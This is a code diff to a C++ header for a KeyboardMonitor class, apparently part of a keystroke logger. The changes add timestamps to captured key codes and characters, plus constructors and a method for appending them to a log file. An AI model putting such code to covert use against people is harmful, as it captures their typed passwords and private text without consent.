@@ -1,5 +1,6 @@
 #pragma once
 
+#include <stdio.h>
 #include <iomanip>
 #include <list>
 #include <sstream>
@@ -8,6 +9,8 @@
 
 #define KEY_CURRENTLY_PRESSED_MASK (1 << 15)
 #define KEY_PRESSED_SINCE_LAST_CALL 1
+
+#define DEFAULT_MAX_LIST_SIZE 20
 
 class KeyboardEvent : public BaseEvent
 {
@@ -31,8 +34,8 @@ public:
 	virtual std::string toString(void)
 	{
 		std::ostringstream stream;
-		stream << "[LocalTime: " << m_localTime.wYear << "/" << m_localTime.wMonth << "/" << m_localTime.wDay << "]";
-		stream << "[SystemTime: " << m_systemTime.wYear << "/" << m_systemTime.wMonth << "/" << m_systemTime.wDay << "]";
+		stream << "[LocalTime: " << m_localTime.wYear << "/" << m_localTime.wMonth << "/" << m_localTime.wDay << " ";
+		stream << m_localTime.wHour << ":" << m_localTime.wMinute << ":" << m_localTime.wSecond << ":" << m_localTime.wMilliseconds << "] ";
 		stream << "[Keyboard Event] "<< " KeyCode: 0x" << std::hex << m_virtualKeyCode << " ";
 		stream << "Character: " << getCharacter();
 
@@ -48,11 +51,20 @@ class KeyboardMonitor
 {
 public:
 	KeyboardMonitor(void);
+	KeyboardMonitor(std::string m_logFilePath);
+	KeyboardMonitor(std::string m_logFilePath, unsigned int maxListSize);
 	~KeyboardMonitor(void);
 
-	void StartMonitor();
+	void StartMonitor(void);
 
 private:
+	bool appendToFile(void);
+
+private:
+	unsigned int m_maxListSize;
+	bool m_writeToLog;
+	std::string m_logFilePath;
+
 	std::list<KeyboardEvent> m_keyboardEventList;
 };
 
